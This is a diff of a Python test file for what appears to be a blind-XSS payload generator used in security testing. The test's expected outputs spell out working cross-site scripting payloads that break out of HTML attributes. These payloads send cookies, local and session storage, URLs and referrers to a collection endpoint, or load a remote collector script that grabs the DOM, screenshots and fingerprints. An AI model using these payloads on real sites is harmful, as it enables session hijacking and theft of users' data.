@@ -17,46 +17,46 @@ def test_generate_payload(client):
         client_id=1,
         url="http://127.0.0.1",
         xss_type="s",
-        to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer"],
+        data_to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer"],
         code_type="html",
         tags=["tag1", "tag2"],
     )
     expected_response = f'\'>"><script>new Image().src="http://127.0.0.1/api/x/s/{client_name1.uid}?tags=tag1,tag2&cookies="+encodeURIComponent(document.cookie)+"&local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"&session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"&origin_url="+encodeURIComponent(location.href)+"&referrer="+encodeURIComponent(document.referrer)</script>'
-    assert rv.get_json()["detail"] == expected_response
+    assert rv.get_json()["message"] == expected_response
     rv = generate_payload(
         client,
         access_header,
         client_id=1,
         code_type="js",
         xss_type="r",
-        to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
+        data_to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
         url="http://127.0.0.1",
+        tags=[],
     )
     b64_payload = base64.b64encode(
         str.encode(
             json.dumps(
                 {
                     "url": f"http://127.0.0.1/api/x/r/{client_name1.uid}",
-                    "to_gather": ["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
+                    "data_to_gather": ["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
                     "tags": [],
                 }
             )
         )
     ).decode()
     expected_response = f';}};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.onload=function(){{sendData("{b64_payload}")}};document.body.appendChild(js);'
-
-    assert rv.get_json()["detail"] == expected_response
+    assert rv.get_json()["message"] == expected_response
     rv = generate_payload(client, access_header, client_id=1)
-    assert b"Missing url" in rv.data
+    assert b"Missing URL" in rv.data
     rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1")
-    assert b"Missing xss_type" in rv.data
+    assert b"Missing XSS type" in rv.data
     rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", xss_type="s")
-    assert b"Missing code_type" in rv.data
+    assert b"Missing code type" in rv.data
     rv = generate_payload(client, access_header, url="http://127.0.0.1")
-    assert b"Missing client_id" in rv.data
-    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="js", xss_type="r")
+    assert b"Missing client ID" in rv.data
+    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="js", xss_type="r", data_to_gather=[], tags=[])
     expected_response = ';};new Image().src="http://127.0.0.1/api/x/r/' + client_name1.uid + '";'
-    assert rv.get_json()["detail"] == expected_response
+    assert rv.get_json()["message"] == expected_response
     rv = generate_payload(
         client,
         access_header,
@@ -64,24 +64,25 @@ def test_generate_payload(client):
         url="http://127.0.0.1",
         code_type="html",
         xss_type="r",
-        to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
+        data_to_gather=["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
+        tags=[],
     )
     b64_payload = base64.b64encode(
         str.encode(
             json.dumps(
                 {
                     "url": f"http://127.0.0.1/api/x/r/{client_name1.uid}",
-                    "to_gather": ["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
+                    "data_to_gather": ["cookies", "local_storage", "session_storage", "origin_url", "referrer", "dom", "screenshot", "fingerprint"],
                     "tags": [],
                 }
             )
         )
     ).decode()
     expected_response = f'\'>"><script src=http://127.0.0.1/static/collector.min.js></script><script>sendData("{b64_payload}")</script>'
-    assert rv.get_json()["detail"] == expected_response
-    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="html", xss_type="r")
+    assert rv.get_json()["message"] == expected_response
+    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="html", xss_type="r", data_to_gather=[], tags=[])
     expected_response = '\'>"><img src="http://127.0.0.1/api/x/r/{}" />'.format(client_name1.uid)
-    assert rv.get_json()["detail"] == expected_response
+    assert rv.get_json()["message"] == expected_response
     rv = generate_payload(
         client,
         access_header,
@@ -90,24 +91,16 @@ def test_generate_payload(client):
         code_type="js",
         xss_type="r",
         tags=["tag1", "tag2"],
-        to_gather=["origin_url"],
+        data_to_gather=["origin_url"],
     )
     expected_response = f';}};new Image().src="http://127.0.0.1/api/x/r/{client_name1.uid}?tags=tag1,tag2&origin_url="+encodeURIComponent(location.href);'
-    assert rv.get_json()["detail"] == expected_response
-    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="js", xss_type="r", tags=["tag1", "tag2"])
+    assert rv.get_json()["message"] == expected_response
+    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="js", xss_type="r", data_to_gather=[], tags=["tag1", "tag2"])
     expected_response = f';}};new Image().src="http://127.0.0.1/api/x/r/{client_name1.uid}?tags=tag1,tag2;'
-    assert rv.get_json()["detail"] == expected_response
-    rv = generate_payload(
-        client,
-        access_header,
-        client_id=1,
-        url="http://127.0.0.1",
-        code_type="js",
-        xss_type="r",
-        to_gather=["origin_url"],
-    )
+    assert rv.get_json()["message"] == expected_response
+    rv = generate_payload(client, access_header, client_id=1, url="http://127.0.0.1", code_type="js", xss_type="r", data_to_gather=["origin_url"], tags=[])
     expected_response = f';}};new Image().src="http://127.0.0.1/api/x/r/{client_name1.uid}?origin_url="+encodeURIComponent(location.href);'
-    assert rv.get_json()["detail"] == expected_response
+    assert rv.get_json()["message"] == expected_response
 
 
 def test_delete_xss(client):
